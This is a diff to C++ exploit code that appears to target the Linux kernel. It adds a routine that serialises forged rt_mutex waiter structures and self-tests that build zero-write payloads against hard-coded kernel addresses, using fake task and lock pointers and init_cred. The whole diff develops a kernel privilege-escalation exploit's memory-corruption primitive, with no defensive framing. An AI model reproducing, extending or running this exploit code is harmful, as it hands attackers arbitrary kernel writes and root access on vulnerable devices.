@@ -52,6 +52,24 @@ namespace ghostlock::memory {
                span_store64(waiter, 0x28, stamp.left);
     }
 
+    bool encode_waiter_words(std::span<std::byte> buffer, size_t offset,
+                             const WaiterWords &words) noexcept {
+        if (offset > buffer.size() || kWaiterBytes > buffer.size() - offset) {
+            return false;
+        }
+        const std::uint64_t raw[kWaiterWords] = {
+            words.tree_pc, words.tree_right, words.tree_left,
+            words.pi_pc, words.pi_right, words.pi_left,
+            words.task, words.lock,
+            words.prio, words.deadline, words.ww_ctx,
+        };
+        for (size_t i = 0; i < kWaiterWords; i++) {
+            memcpy(buffer.data() + offset + i * sizeof(std::uint64_t), &raw[i],
+                   sizeof(std::uint64_t));
+        }
+        return true;
+    }
+
     bool encode_multicast_waiter(std::span<std::byte> buffer,
                                  size_t waiter_offset, size_t task_offset, size_t lock_offset,
                                  uintptr_t fake_task, uintptr_t fake_lock) noexcept {
@@ -206,6 +224,78 @@ namespace ghostlock::memory {
             return 0;
         std::byte undersized[0x2f]{};
         if (encode_compact_waiter(undersized, w1, rejected)) return 0;
+
+        constexpr std::uintptr_t leaf_target = 0xffffff8000126000ULL;
+        constexpr std::uintptr_t leaf_task = 0xffffff8800005800ULL;
+        constexpr std::uintptr_t leaf_lock = 0xffffff802aa3a590ULL;
+        const WriteRequest leaf = WriteRequest::make(
+            leaf_target, WriteMode::Zero, /*leaf=*/1);
+        const PayloadWriteLayout leaf_layout = payload_write_layout(
+            &leaf, page, 0x1111, 0x2222, init_cred);
+        std::array<std::byte, kWaiterBytes> strip{};
+        if (!encode_waiter_words(strip, 0,
+                                 waiter_words(leaf_layout, leaf_task, leaf_lock, 140)))
+            return 0;
+        const std::uint64_t expected[kWaiterWords] = {
+            leaf_target - 8, 0, 0,
+            0, 0, 0,
+            leaf_task, leaf_lock, 140, 0, 0,
+        };
+        for (size_t i = 0; i < kWaiterWords; i++) {
+            if (load64(reinterpret_cast<const unsigned char *>(strip.data()),
+                       i * sizeof(std::uint64_t)) != expected[i])
+                return 0;
+        }
+
+        /* Pointer layout: the target is the left child, not the pc. */
+        constexpr std::uintptr_t ptr_target = 0xffffff8000128000ULL;
+        const WriteRequest pointer = WriteRequest::make(
+            ptr_target, WriteMode::Zero, /*leaf=*/false);
+        const PayloadWriteLayout pointer_layout = payload_write_layout(
+            &pointer, page, 0x1111, 0x2222, init_cred);
+        const WaiterWords pointer_words =
+            waiter_words(pointer_layout, leaf_task, leaf_lock, 140);
+        if (pointer_words.tree_pc != page + 0x100 ||
+            pointer_words.tree_right != 0 ||
+            pointer_words.tree_left != ptr_target)
+            return 0;
+
+        std::array<std::byte, 0x60> window{};
+        if (!encode_waiter_words(window, 8, pointer_words)) return 0;
+        if (load64(reinterpret_cast<const unsigned char *>(window.data()),
+                   8 + 0x38) != leaf_lock)
+            return 0;
+        for (size_t i = 0; i < 8; i++) {
+            if (window[i] != std::byte{0}) return 0;
+        }
+
+        /* The prio word is family-shaped; both stack-stamp routes must agree
+         * with the page builder on which shape they write. */
+        constexpr std::uint64_t k5_10_prio_word = 140;
+        constexpr std::uint64_t kPacked_prio_word = (140ULL << 32) | 3;
+        std::array<std::byte, kWaiterBytes> prio_strip{};
+        if (!encode_waiter_words(prio_strip, 0,
+                                 waiter_words(leaf_layout, leaf_task, leaf_lock,
+                                              k5_10_prio_word)))
+            return 0;
+        if (load64(reinterpret_cast<const unsigned char *>(prio_strip.data()), 0x40) !=
+            k5_10_prio_word)
+            return 0;
+        if (!encode_waiter_words(prio_strip, 0,
+                                 waiter_words(leaf_layout, leaf_task, leaf_lock,
+                                              kPacked_prio_word)))
+            return 0;
+        if (load64(reinterpret_cast<const unsigned char *>(prio_strip.data()), 0x40) !=
+            kPacked_prio_word)
+            return 0;
+        if (load64(reinterpret_cast<const unsigned char *>(prio_strip.data()), 0x38) !=
+                leaf_lock ||
+            load64(reinterpret_cast<const unsigned char *>(prio_strip.data()), 0x48) != 0)
+            return 0;
+
+        std::array<std::byte, kWaiterBytes - 1> too_small{};
+        if (encode_waiter_words(too_small, 0, pointer_words)) return 0;
+        if (encode_waiter_words(window, 9, pointer_words)) return 0;
         /* Multicast geometry that would run past the supplied span is rejected
      * instead of written out of bounds. */
         std::array<std::byte, 0x40> multicast_small{};
